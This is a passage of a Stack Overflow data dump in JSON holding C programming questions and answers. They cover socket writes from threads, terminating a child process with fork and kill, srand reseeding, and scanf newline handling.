avoid <code>memcpy</code> at all cost, and allocate a big buffer to began with.</p>\n"}], "owner": {"reputation": 1880, "user_id": 1269074, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/NSGtc.jpg?s=128&g=1", "display_name": "Oladipo Olasemo", "link": "https://stackoverflow.com/users/1269074/oladipo-olasemo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1451, "favorite_count": 1, "answer_count": 3, "score": 2, "last_activity_date": 1482907233, "creation_date": 1482887907, "question_id": 41354154, "link": "https://stackoverflow.com/questions/41354154/multiple-threads-writing-to-a-socket", "title": "Multiple Threads Writing to a Socket", "body": "<p>I created a TCP client application and decided to handle incoming data with a new thread using the pthread library in c.</p>\n\n<p>However, I read somewhere that unexpected things could happen when multiple threads try to write to the same file descriptor for a socket connection.</p>\n\n<p>what is the best approach to ensure these 'unexpected things' don't happen.</p>\n\n<p>Is there even a need to using threads in the first place?</p>\n\n<p>NB: My decision to use threads was to prevent any blocking operations.</p>\n"}, {"tags": ["c", "fork", "kill"], "comments": [{"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1482889550, "post_id": 41354123, "comment_id": 69910536, "body": "A child should not kill his/her parents. Your problem is about design. You should use <code>thread</code> or <code>select</code>(if you are on linux you can add 0 to select, not portable)."}, {"owner": {"reputation": 131, "user_id": 7158454, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/sv8ib.jpg?s=128&g=1", "display_name": "UrbiJr", "link": "https://stackoverflow.com/users/7158454/urbijr"}, "reply_to_user": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1482889967, "post_id": 41354123, "comment_id": 69910599, "body": "<code>select</code>? I use it to handle the sockets, what does it has to do with my problem? Are you talking about using <code>select</code> in a way related to <code>fork</code>?"}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1482890124, "post_id": 41354123, "comment_id": 69910635, "body": "my point is that your use of <code>fork()</code> is not the purpose of it. <code>fork()</code> create a new <b>process</b>, that do the job that you want it do. Here you want that your child kill your the parent. This is not the purpose of <code>fork()</code>. You should use a thread that handle ncurses. With a variable <code>running</code>, set to false when thread stop. The main program will stop when this variable is  false. Or use select to handle <code>0</code>. So you could read the user input with ncurses."}, {"owner": {"reputation": 131, "user_id": 7158454, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/sv8ib.jpg?s=128&g=1", "display_name": "UrbiJr", "link": "https://stackoverflow.com/users/7158454/urbijr"}, "reply_to_user": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1482890586, "post_id": 41354123, "comment_id": 69910718, "body": "actually the <i>first child</i> has to kill his own child (that I called <i>second child</i> in my question), not the parent... Still a bad behaviour? I woudn&#39;t like to change my code again introducing the threads. I mean, if I have to, I&#39;ll do it, but I&#39;d rather not"}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 1, "creation_date": 1482890912, "post_id": 41354123, "comment_id": 69910781, "body": "You lost me. Who is ncurses? Who need to kill who? If you want kill a child in the parent it&#39;s easy your have his pid return by fork. You are very unclear. You could use <a href=\"http://man7.org/linux/man-pages/man2/getpid.2.html\" rel=\"nofollow noreferrer\"><code>getpid()</code></a> before fork so the child know the pid of his parent but it&#39;s <b>very ugly</b>."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1482900100, "post_id": 41354123, "comment_id": 69912608, "body": "@Stargateur: As far as I can tell, the child is not killing its parent; the first child process is killing its own child when it (the first child) is told to exit.  The main parent just hangs around waiting for its own (singleton) child to exit.  The child itself creates a second child, and presumably communicates with it on occasion, and then is required to arrange to kill its child when it is told to exit (commit suicide?).  Process hierarchies end up using morbid terminology!"}, {"owner": {"reputation": 131, "user_id": 7158454, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/sv8ib.jpg?s=128&g=1", "display_name": "UrbiJr", "link": "https://stackoverflow.com/users/7158454/urbijr"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1482931993, "post_id": 41354123, "comment_id": 69927528, "body": "@JonathanLeffler yeah you got me perfectly."}], "answers": [{"comments": [{"owner": {"reputation": 131, "user_id": 7158454, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/sv8ib.jpg?s=128&g=1", "display_name": "UrbiJr", "link": "https://stackoverflow.com/users/7158454/urbijr"}, "edited": false, "score": 0, "creation_date": 1482932666, "post_id": 41355435, "comment_id": 69927903, "body": "Yeah, i created that example to avoid to copy my long code. Thanks for your time. I&#39;ll try this later on and I&#39;ll let you know."}, {"owner": {"reputation": 131, "user_id": 7158454, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/sv8ib.jpg?s=128&g=1", "display_name": "UrbiJr", "link": "https://stackoverflow.com/users/7158454/urbijr"}, "edited": false, "score": 0, "creation_date": 1482942108, "post_id": 41355435, "comment_id": 69933215, "body": "Hey @JonathanLeffler I just tested it and it seems it doesn&#39;t work... Basically it seems it copies the <i>first child</i> process, I don&#39;t know. I think it executes its instructions 2 times and simultaneously. I say this because when I run it, it repeats the printfs (of the <i>first child</i>), and when it starts ncurses it basically crashes."}, {"owner": {"reputation": 131, "user_id": 7158454, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/sv8ib.jpg?s=128&g=1", "display_name": "UrbiJr", "link": "https://stackoverflow.com/users/7158454/urbijr"}, "edited": false, "score": 0, "creation_date": 1482942224, "post_id": 41355435, "comment_id": 69933284, "body": "However the <i>second child</i> works fine and there&#39;s not anymore the process zombie that keeps my file open."}, {"owner": {"reputation": 131, "user_id": 7158454, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/sv8ib.jpg?s=128&g=1", "display_name": "UrbiJr", "link": "https://stackoverflow.com/users/7158454/urbijr"}, "edited": false, "score": 0, "creation_date": 1482942800, "post_id": 41355435, "comment_id": 69933594, "body": "Wait, I don&#39;t know how but now it works it all. I just uncommented a <code>for(;;)</code> loop -that has <code>select</code> inside and all the stuff to handle the connections- inside the <i>second child</i>. Well, thank you."}, {"owner": {"reputation": 131, "user_id": 7158454, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/sv8ib.jpg?s=128&g=1", "display_name": "UrbiJr", "link": "https://stackoverflow.com/users/7158454/urbijr"}, "edited": false, "score": 0, "creation_date": 1482943062, "post_id": 41355435, "comment_id": 69933699, "body": "Oh yeah I got it: it must be because without the <code>for(;;)</code>, the <i>second child</i> terminated before. Wowsers."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 131, "user_id": 7158454, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/sv8ib.jpg?s=128&g=1", "display_name": "UrbiJr", "link": "https://stackoverflow.com/users/7158454/urbijr"}, "edited": false, "score": 0, "creation_date": 1482943636, "post_id": 41355435, "comment_id": 69934015, "body": "Glad you&#39;ve resolved it.  I&#39;ve updated the answer with the debug code I was using when I got your &quot;doesn&#39;t work&quot; message."}], "tags": [], "owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "is_accepted": true, "score": 3, "last_activity_date": 1482943591, "last_edit_date": 1495541784, "creation_date": 1482899940, "answer_id": 41355435, "question_id": 41354123, "link": "https://stackoverflow.com/questions/41354123/exit-the-program-from-parent-before-child-process-has-terminated/41355435#41355435", "title": "exit() the program from parent before child process has terminated", "body": "<p>In your code, you reuse the variable <code>pid</code>, but fortunately, the non-zero <code>pid</code> is the one you need to signal.</p>\n\n<p>Hence:</p>\n\n<pre><code>#include &lt;signal.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;sys/wait.h&gt;\n#include &lt;unistd.h&gt;\n\nextern int menu(void);\n\nstatic void wait_for_pid(int pid)\n{\n    int status;\n    int corpse;\n    while ((corpse = wait(&amp;status)) &gt;= 0 &amp;&amp; corpse != pid)\n        printf(\"Unexpected child %d exited with status 0x%.4X\\n\", corpse, status);\n    if (corpse == pid)\n        printf(\"Child %d exited with status 0x%.4X\\n\", corpse, status);\n    else\n        printf(\"Child %d died without its death being tracked\\n\", pid);\n}\n\nint main(void)\n{\n    pid_t pid;\n    if ((pid = fork()) &lt; 0)\n    {\n        perror(\"main fork failure:\");\n        exit(1);\n    }\n\n    if (pid == 0)\n    {\n        if ((pid = fork()) &lt; 0)\n        {\n            perror(\"child fork failure:\");\n            exit(1);\n        }\n        if (pid == 0)\n        {\n            pause();    /* Do nothing until signalled */\n            exit(0);\n        }\n        /* this is the first child */\n        int choice = menu();\n        switch (choice)\n        {\n        case 1:\n            /* action 1 */\n            break;\n        case 2:\n            kill(pid, SIGTERM);\n            exit(2);\n            /*NOTREACHED*/\n        }\n        wait_for_pid(pid);\n        exit(0);\n    }\n    wait_for_pid(pid);\n    return 0;\n}\n</code></pre>\n\n<p>The loop in the <code>wait_for_pid()</code> function should be overkill for the child, but the parent process could have children it doesn't know about under some circumstances \u2014 unlikely but not impossible circumstances.</p>\n\n<p>The use of <code>pause()</code> in the second child is simply writing some code; it is not useful and would not therefore be what you'd write there.  Writing the comment <code>/* action 1 */</code> is likewise dummy code; you'd replace it with code that does something useful.  I'd probably have functions to call for the first child and the second child, rather than embedding much code in <code>main()</code>.  I assume that it's written as shown to create an MCVE (<a href=\"https://stackoverflow.com/help/mcve\">Minimal, Complete, Verifiable Example</a>); thank you for keeping the code small.</p>\n\n<hr>\n\n<p>The code above was untested because there was no <code>menu()</code> function.  The code below has a menu function \u2014 not that it is very interactive.</p>\n\n<pre><code>#include &lt;signal.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;sys/wait.h&gt;\n#include &lt;unistd.h&gt;\n\nextern int menu(void);\n\nint menu(void)\n{\n    printf(\"Dozing...\\n\");\n    sleep(1);\n    printf(\"Menu option 2 chosen\\n\");\n    return 2;\n}\n\nstatic void wait_for_pid(int pid)\n{\n    int status;\n    int corpse;\n    int curpid = getpid();\n    printf(\"%d: waiting for children to die\\n\", curpid);\n    while ((corpse = wait(&amp;status)) &gt;= 0 &amp;&amp; corpse != pid)\n        printf(\"%d: Unexpected child %d exited with status 0x%.4X\\n\", curpid, corpse, status);\n    if (corpse == pid)\n        printf(\"%d: Child %d exited with status 0x%.4X\\n\", curpid, corpse, status);\n    else\n        printf(\"%d: Child %d died without its death being tracked\\n\", curpid, pid);\n}\n\nint main(void)\n{\n    pid_t pid;\n    if ((pid = fork()) &lt; 0)\n    {\n        perror(\"main fork failure:\");\n        exit(1);\n    }\n\n    if (pid == 0)\n    {\n        if ((pid = fork()) &lt; 0)\n        {\n            perror(\"child fork failure:\");\n            exit(1);\n        }\n        if (pid == 0)\n        {\n            printf(\"Second child (%d) - pausing\\n\", (int)getpid());\n            pause();    /* Do nothing until signalled */\n            printf(\"Second child (%d) - awake despite no signal handling\\n\", (int)getpid());\n            exit(0);\n        }\n        /* this is the first child */\n        printf(\"First child (%d) - menuing\\n\", (int)getpid());\n        int choice = menu();\n        switch (choice)\n        {\n        case 1:\n            /* action 1 */\n            break;\n        case 2:\n            printf(\"kill(%d, SIGTERM)\\n\", pid);\n            kill(pid, SIGTERM);\n            wait_for_pid(pid);\n            exit(2);\n            /*NOTREACHED*/\n        }\n        /* Reached on menu choices != 2 */\n        /* Probably needs a loop around the menu() - end loop before wait_for_pid()  */\n        wait_for_pid(pid);\n        exit(0);\n    }\n    wait_for_pid(pid);\n    return 0;\n}\n</code></pre>\n\n<p>When run, a sample output sequence was:</p>\n\n<pre><code>19489: waiting for children to die\nFirst child (19490) - menuing\nDozing...\nSecond child (19491) - pausing\nMenu option 2 chosen\nkill(19491, SIGTERM)\n19490: waiting for children to die\n19490: Child 19491 exited with status 0x000F\n19489: Child 19490 exited with status 0x0200\n</code></pre>\n\n<p>All of which looks as would be expected.  You can see the death from SIGTERM in the status 0x000F (SIGTERM is normally 15, and is 15 on macOS Sierra, though AFAIK no standard demands that it is 15).  You can see the first child exited normally with status 2 from the 0x0200.  You can see that the parent started waiting before the children did anything.  And you can see the debugging techniques \u2014 copious printing and including the PID most of the time.</p>\n"}], "owner": {"reputation": 131, "user_id": 7158454, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/sv8ib.jpg?s=128&g=1", "display_name": "UrbiJr", "link": "https://stackoverflow.com/users/7158454/urbijr"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1843, "favorite_count": 0, "accepted_answer_id": 41355435, "answer_count": 1, "score": 0, "last_activity_date": 1482943591, "creation_date": 1482887610, "question_id": 41354123, "link": "https://stackoverflow.com/questions/41354123/exit-the-program-from-parent-before-child-process-has-terminated", "title": "exit() the program from parent before child process has terminated", "body": "<p>I have a C server. This server has to handle multiple connections <strong>and</strong> user's input (through a simple ncurses GUI). So I created two childs.<br>\nMy problem comes when from the main menu of the user interface, I need to <code>exit</code> the program (then terminate the second child process <em>-which handles the connections-</em> from the first child process).  </p>\n\n<p>I'll try to explain myself with a little example:</p>\n\n<pre><code>int main(){\n    pid_t pid;\n    int status1, status2;\n    if((pid = fork()) &lt; 0){\n        perror(\"main fork failure:\");\n        exit(1);\n    }\n\n    if(pid == 0){\n        pid = fork();\n        if(pid == 0){\n            /*  \n                some stuff the second child does while \n                the first child is already running\n            */\n        }\n        /* this is the first child */\n        int choice;\n        choice = menu();\n        switch(choice){\n            case 1:\n                break;\n            case 2:\n                /* \n                   HERE I have to exit (from the first child first,\n                   and from the program then): how can I kill the\n                   second child that is running to prevent\n                   zombie processes? \n                */\n                // kill() which pid?\n                exit(2);\n                break;\n        }\n        wait(&amp;status2);\n    }\n    wait(&amp;status1);\n    return 0;\n}\n</code></pre>\n\n<p>So, how can I <code>kill</code> it if I don't know the second child <code>pid</code> from the first child?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1482896817, "post_id": 41354009, "comment_id": 69911944, "body": "Also a duplicate of <a href=\"http://stackoverflow.com/questions/7343833/srand-why-call-it-only-once/\"><code>srand()</code> \u2014 why call it just once?</a>"}], "answers": [{"tags": [], "owner": {"reputation": 16091, "user_id": 4975822, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/c04e8c4c984d36bea8a6239574980fbd?s=128&d=identicon&r=PG&f=1", "display_name": "artm", "link": "https://stackoverflow.com/users/4975822/artm"}, "is_accepted": true, "score": 3, "last_activity_date": 1482886546, "creation_date": 1482886546, "answer_id": 41354019, "question_id": 41354009, "link": "https://stackoverflow.com/questions/41354009/c-why-all-elements-of-array-are-the-same/41354019#41354019", "title": "C: Why all elements of array are the same", "body": "<p>You should move <code>srand(time(NULL));</code> out of <code>rand_char()</code>. <code>srand</code> should be done once before the <code>for</code> loop, not every time in <code>rand_char()</code></p>\n"}], "owner": {"reputation": 25, "user_id": 7336460, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/d4fq7.jpg?s=128&g=1", "display_name": "Manoh Barkas", "link": "https://stackoverflow.com/users/7336460/manoh-barkas"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 44, "favorite_count": 0, "closed_date": 1482887391, "accepted_answer_id": 41354019, "answer_count": 1, "score": 1, "last_activity_date": 1482886900, "creation_date": 1482886389, "question_id": 41354009, "link": "https://stackoverflow.com/questions/41354009/c-why-all-elements-of-array-are-the-same", "closed_reason": "Duplicate", "title": "C: Why all elements of array are the same", "body": "<p>Function rand_char is used to generate random letters that will be assigned to the string.   </p>\n\n<pre><code>char rand_char(){\n    char rand_ch;\n    srand(time(NULL));\n    rand_ch = rand() %26 +'A';\n    return rand_ch;\n}\nfor (j=0; j&lt;7; j++){\n    game-&gt;players[0].hand[j].letter = rand_char();\n}\n</code></pre>\n\n<p>if I check printf(\"%c\",game->players[0].hand[j].letter); all elements have the same letter. But they should have different random letters.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 44000, "user_id": 535275, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/Ft2Mw.jpg?s=128&g=1", "display_name": "Scott Hunter", "link": "https://stackoverflow.com/users/535275/scott-hunter"}, "edited": false, "score": 1, "creation_date": 1482885830, "post_id": 41353930, "comment_id": 69909881, "body": "What does &quot;everytime overleaps&quot; mean?  Can you provide an example?"}, {"owner": {"reputation": 13595, "user_id": 668501, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/3f15b157200c05100d6baeb0ede510f0?s=128&d=identicon&r=PG", "display_name": "Soren", "link": "https://stackoverflow.com/users/668501/soren"}, "edited": false, "score": 0, "creation_date": 1482885870, "post_id": 41353930, "comment_id": 69909897, "body": "What do you mean by &quot;overleaps&quot;? -- explain what you expect it to do and contrast it what to see it is actually doing."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 7, "creation_date": 1482886041, "post_id": 41353930, "comment_id": 69909928, "body": "<code>fflush(stdin);&#47;&#47;clear</code> - not clear. Wrong! <code>fflush</code>ing an input stream invokes undefined behaviour."}, {"owner": {"reputation": 17, "user_id": 7032129, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/SOBKS.jpg?s=128&g=1", "display_name": "MAXLooW", "link": "https://stackoverflow.com/users/7032129/maxloow"}, "edited": false, "score": 0, "creation_date": 1482886336, "post_id": 41353930, "comment_id": 69909972, "body": "I cant type anything, the switch command give me the default case back, because i cant type a key."}, {"owner": {"reputation": 28476, "user_id": 6862601, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/ppP5k.jpg?s=128&g=1", "display_name": "codeforester", "link": "https://stackoverflow.com/users/6862601/codeforester"}, "edited": false, "score": 0, "creation_date": 1482886998, "post_id": 41353930, "comment_id": 69910085, "body": "Removing fflush(stdin) does solve the problem.  I just ran your code with that change."}, {"owner": {"reputation": 17, "user_id": 7032129, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/SOBKS.jpg?s=128&g=1", "display_name": "MAXLooW", "link": "https://stackoverflow.com/users/7032129/maxloow"}, "edited": false, "score": 0, "creation_date": 1482887692, "post_id": 41353930, "comment_id": 69910191, "body": "I try it without fflush(stdin), dont work. You use windows or linux? Possible its an OS problem?"}, {"owner": {"reputation": 22954, "user_id": 5238915, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/fncqh.jpg?s=128&g=1", "display_name": "RoadRunner", "link": "https://stackoverflow.com/users/5238915/roadrunner"}, "edited": false, "score": 0, "creation_date": 1482899609, "post_id": 41353930, "comment_id": 69912489, "body": "Why are you not testing the return value of <code>scanf()</code>?"}], "answers": [{"comments": [{"owner": {"reputation": 17, "user_id": 7032129, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/SOBKS.jpg?s=128&g=1", "display_name": "MAXLooW", "link": "https://stackoverflow.com/users/7032129/maxloow"}, "edited": false, "score": 0, "creation_date": 1482934129, "post_id": 41354292, "comment_id": 69928731, "body": "i try to replace the line with the error with your suggeestion &quot;scanf(&quot;%d%*c&quot;,&amp;n);&quot; it dont work, possible i understand it false sry."}, {"owner": {"reputation": 131, "user_id": 7158454, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/sv8ib.jpg?s=128&g=1", "display_name": "UrbiJr", "link": "https://stackoverflow.com/users/7158454/urbijr"}, "reply_to_user": {"reputation": 17, "user_id": 7032129, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/SOBKS.jpg?s=128&g=1", "display_name": "MAXLooW", "link": "https://stackoverflow.com/users/7032129/maxloow"}, "edited": false, "score": 0, "creation_date": 1482939735, "post_id": 41354292, "comment_id": 69931899, "body": "@MAXLooW I updated the answer with the definitive code in order to avoid possible misunderstandings. Just copy and paste it."}], "tags": [], "owner": {"reputation": 131, "user_id": 7158454, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/sv8ib.jpg?s=128&g=1", "display_name": "UrbiJr", "link": "https://stackoverflow.com/users/7158454/urbijr"}, "is_accepted": false, "score": 0, "last_activity_date": 1482939641, "last_edit_date": 1495541784, "creation_date": 1482889358, "answer_id": 41354292, "question_id": 41353930, "link": "https://stackoverflow.com/questions/41353930/c-char-scanf-problems/41354292#41354292", "title": "C - char scanf problems", "body": "<p>As @codaddict said <a href=\"https://stackoverflow.com/questions/3744776/simple-c-scanf-does-not-work\">here</a>,</p>\n\n<blockquote>\n  <p>When reading input using scanf, the input is read after the return key is pressed but the newline generated by the return key is not consumed by scanf, which means the next time you read a char from standard input there will be a newline ready to be read.</p>\n</blockquote>\n\n<p>A simple solution is to exclude the newline character like this:  </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main()\n{\n    int z1,z2,erg=0;\n    char buf;\n    char eingabe;\n\n    while(1){\n\n\n    printf(\"Geben Sie die erste Zahl an: \");\n    scanf(\"%d\",&amp;z1); //works\n    scanf(\"%c\", &amp;buf);\n\n    printf(\"\\nGeben Sie die zweite Zahl an: \");\n    scanf(\"%d\",&amp;z2); //works\n    scanf(\"%c\", &amp;buf);\n\n    erg=z1*z2; //works\n    printf(\"\\n%d * %d = %d\",z1,z2,erg); //works\n\n    printf(\"\\n\");\n    printf(\"#######################\");\n    printf(\"\\n\");\n\n    printf(\"Weiter = W\\n\");\n    printf(\"Stop = P\\n\");\n\n    printf(\"Eingabe: \");\n    scanf(\"%c\",&amp;eingabe); \n\n    switch(eingabe){\n        case 'w':\n            system(\"clear\");\n            break;\n        case 'p':\n            system(\"close\");\n            break;\n        default:\n            printf(\"\\nEingabe Unbekannt\");\n    }\n\n    printf(\"\\n\");\n\n    }  \n\n\n    return 0;\n}\n</code></pre>\n\n<p><em>OR</em> replacing the <code>int</code>s <code>scanf</code>s with something like this: <code>scanf(\"%d%*c\",&amp;n);</code>,    </p>\n\n<p><strong>THIS WAY:</strong>  </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main()\n{\n    int z1,z2,erg=0;\n    char buf;\n    char eingabe;\n\n    while(1){\n\n        printf(\"Geben Sie die erste Zahl an: \");\n        scanf(\"%d%*c\",&amp;z1);    //%*c removes the newline from the buffer\n\n        printf(\"\\nGeben Sie die zweite Zahl an: \");\n        scanf(\"%d%*c\",&amp;z2);    //%*c removes the newline from the buffer\n\n        erg=z1*z2; //works\n        printf(\"\\n%d * %d = %d\",z1,z2,erg); //works\n\n        printf(\"\\n\");\n        printf(\"#######################\");\n        printf(\"\\n\");\n\n        printf(\"Weiter = W\\n\");\n        printf(\"Stop = P\\n\");\n\n        printf(\"Eingabe: \");\n        scanf(\"%c\",&amp;eingabe);    //no problem with this.\n\n        switch(eingabe){\n            case 'w':\n            system(\"clear\");\n            break;\n        case 'p':\n            system(\"close\");\n            break;\n        default:\n            printf(\"\\nEingabe Unbekannt\");\n        }\n\n        printf(\"\\n\");\n\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>And that's it my friend!</p>\n"}, {"comments": [{"owner": {"reputation": 17, "user_id": 7032129, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/SOBKS.jpg?s=128&g=1", "display_name": "MAXLooW", "link": "https://stackoverflow.com/users/7032129/maxloow"}, "edited": false, "score": 0, "creation_date": 1482934283, "post_id": 41357346, "comment_id": 69928824, "body": "with getchar before scanf it work thanks! system(&quot;exit&quot;) not work, but exit(EXIT_SUCCESS); works perfect."}], "tags": [], "owner": {"reputation": 142, "user_id": 7279579, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/49cabdc8b29195ba696ce54b7bbb3f89?s=128&d=identicon&r=PG", "display_name": "Abel Tom", "link": "https://stackoverflow.com/users/7279579/abel-tom"}, "is_accepted": true, "score": 0, "last_activity_date": 1482910551, "last_edit_date": 1482910551, "creation_date": 1482910101, "answer_id": 41357346, "question_id": 41353930, "link": "https://stackoverflow.com/questions/41353930/c-char-scanf-problems/41357346#41357346", "title": "C - char scanf problems", "body": "<ol>\n<li>as @UrbiJr rightly mentioned, solution would be to exclude your newline character. In order to do that, that you could also use <code>getchar()</code>.\nI ran your code with <code>getchar()</code> and it works, i have a Linux machine too, compiled using GCC and ran the binary in GNOME Terminal. </li>\n<li><p>Also, assuming you want to exit the program when you type the character  'p', are you sure <code>case 'p': system(\"exit\");</code> works on your machine? It did not work for me, so i used <code>case 'p': exit(EXIT_SUCCESS);</code> instead, and it worked.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main()\n{\n   int z1,z2,erg=0;\n   char buf;\n   char eingabe;\n\n   while(1)\n   {\n    printf(\"Geben Sie die erste Zahl an: \");\n    scanf(\"%d\",&amp;z1); //works\n    getchar();\n\n    printf(\"\\nGeben Sie die zweite Zahl an: \");\n    scanf(\"%d\",&amp;z2); //works\n    getchar();\n\n    erg=z1*z2; //works\n    printf(\"\\n%d * %d = %d\",z1,z2,erg); //works\n\n    printf(\"\\n\");\n    printf(\"#######################\");\n    printf(\"\\n\");\n\n   printf(\"Weiter = W\\n\");\n   printf(\"Stop = P\\n\");\n\n  printf(\"Eingabe: \");\n  scanf(\"%c\",&amp;eingabe); //works \n\n   switch(eingabe){\n   case 'w':\n      system(\"clear\");\n      break;\n   case 'p':\n      exit(EXIT_SUCCESS);\n      break;\n   default:\n      printf(\"\\nEingabe Unbekannt\");\n        }\n\n  printf(\"\\n\");\n\n   }  \n        return 0;\n   }\n</code></pre></li>\n</ol>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 7346870, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/L9YhW.png?s=128&g=1", "display_name": "Shiki-kan", "link": "https://stackoverflow.com/users/7346870/shiki-kan"}, "is_accepted": false, "score": 0, "last_activity_date": 1482910845, "creation_date": 1482910845, "answer_id": 41357543, "question_id": 41353930, "link": "https://stackoverflow.com/questions/41353930/c-char-scanf-problems/41357543#41357543", "title": "C - char scanf problems", "body": "<p>It causes your program will get '\\n' (\"Enter\" or \"newline\" from the previous input) as the input. So, put \"getchar();\" before \"scanf(\"%c\",&amp;eingabe);\".</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main()\n{\n    int z1,z2,erg=0;\n    char eingabe;\n\n    while(1){\n\n\n    printf(\"Geben Sie die erste Zahl an: \");\n    scanf(\"%d\",&amp;z1); //works\n    fflush(stdin); //clear\n\n    printf(\"\\nGeben Sie die zweite Zahl an: \");\n    scanf(\"%d\",&amp;z2); //works\n    fflush(stdin);//clear\n\n    erg=z1*z2; //works\n    printf(\"\\n%d * %d = %d\",z1,z2,erg); //works\n\n    printf(\"\\n\");\n    printf(\"#######################\");\n    printf(\"\\n\");\n\n    printf(\"Weiter = W\\n\");\n    printf(\"Stop = P\\n\");\n\n    printf(\"Eingabe: \");\n\n    getchar(); // this is the solution\n\n    scanf(\"%c\",&amp;eingabe); //this is the line with the problem\n    fflush(stdin); //clear\n\n    switch(eingabe){\n        case 'w':\n        system(\"clear\");\n        break;\n        case 'p':\n        system(\"exit\");\n        break;\n        default:\n        